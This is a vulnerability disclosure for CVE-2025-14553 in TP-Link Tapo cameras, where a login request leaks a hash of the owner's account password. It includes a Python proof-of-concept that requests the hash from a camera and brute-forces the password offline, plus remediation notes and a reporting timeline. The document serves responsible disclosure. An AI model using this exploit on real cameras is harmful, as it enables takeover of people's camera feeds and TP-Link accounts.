# Summary

- **CVE ID**: [CVE-2025-14553](https://www.cve.org/cverecord?id=CVE-2025-14553)
- **Affected Product**: TP-Link Tapo TC60, TC70, C100, C110, C120, C200, C210, C220, C225, C310, C320WS, C500, C510W, C520WS
- **Affected Version**: 1.3.9 Build 231019 - 1.3.13 Build 240327
- **Vulnerability Name**: Password Hash Leak Could Lead to Unauthorized Access on Tapo 210 via Local Network
- **Vulnerability Type**: Brute Force Attack on Leaked SHA256 Hash
- **Vulnerability Severity Score** 7.0 (High)
- **VDP**: https://www.tp-link.com/us/press/security-advisory/
- **Researcher**: Juraj Nyíri
- **Date Reported**: 5 Nov 2023

------------------------------
# Description

The authorization introduced in Firmware 1.3.9 for many different Tapo cameras leaks SHA256 Hash of TP-Link Account, which after cracking locally allows for a full control of the camera including access to stream, recordings, any other Tapo camera settings and lastly the full TP-Link account providing full access to any other Tapo or TP-Link devices through cloud. 
Sending a request for authorization causes the camera to respond with the device_confirm key, containing the SHA256 hash of the victims account. In order to send this request, attacker needs to have access to the camera network port 443.

------------------------------
# Proof Of Concept

Connection / Authentication is initiated with the camera by sending request: `{"method": "login", "params": {"encrypt_type": "3", "username": “admin"}}`. 

Camera responds with an object containing `device_confirm` and `nonce` keys. `device_confirm` value is a combination of SHA256 hash of TP-Link password and the `nonce` value. Attacker can save this `device_confirm` key and then initiate local brute-force attack to discover the clear password and gain access to full control of the camera as well as the whole TP-Link account of the victim. 

Following script demonstrates a way how to exploit this vulnerability:

```
# Demo code compatible with Python 3.9.6. Newer python requires override for unverified https request

import hashlib
import requests
import json

host = ""  # ip of the camera, example: 192.168.1.52:443
password_cloud = ""  # for demonstration purposes, we can set this to proper password

session = requests.session()
# Send request which has no confidential information
res = session.request(
    "POST",
    "https://" + host,
    data=json.dumps(
        {"method": "login", "params": {"encrypt_type": "3", "username": "admin"}}
    ),
    headers={
        "Host": host,
        "Referer": "https://" + host,
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Tapo CameraClient Android",
        "Connection": "close",
        "requestByApp": "true",
        "Content-Type": "application/json; charset=UTF-8",
    },
    verify=False,
)
data = res.json()
# Receive back nonce and device_confirm containing the password
nonce = data["result"]["data"]["nonce"]
device_confirm = data["result"]["data"]["device_confirm"]

foundPassword = False
while not foundPassword:
    # brute force all values of password_cloud
    # password_cloud = generateNewPassword() #pseudocode
    hashedSha256Password = (
        hashlib.sha256(password_cloud.encode("utf8")).hexdigest().upper()
    )
    encryptWithNonce = (
        hashlib.sha256(hashedSha256Password.encode("utf8") + nonce.encode("utf8"))
        .hexdigest()
        .upper()
    )
    if encryptWithNonce + nonce == device_confirm:
        print("Password is " + password_cloud)
        foundPassword = True
```

----------------------------
# Remediation

A cloud token is issued automatically for each user's device, when the device connects to the cloud, unless TPLink account has Third Party Compatibility turned on.

# Reference:
- TPLink security advisory: https://www.tp-link.com/us/support/faq/4840/
- CVE: https://www.cve.org/cverecord?id=CVE-2025-14553

---------------------------
# Timeline
- 05.11.2023 - Reported to TP-Link Technical Support
- 07.11.2023 - Received response from TP-Link
- 10.11.2023 - TP-Link confirms the vulnerability
- 11.04.2024 - TP-Link confirms fix for the vulnerability is ready
- 13.12.2024 - TP-Link deploys an ability to turn on 3rd party compatibility, allowing external applications to work with Tapo devices again ([read more](https://github.com/JurajNyiri/HomeAssistant-Tapo-Control/releases/tag/6.0.0))
- 16.12.2025 - TP-Link publishes CVE and security advisory
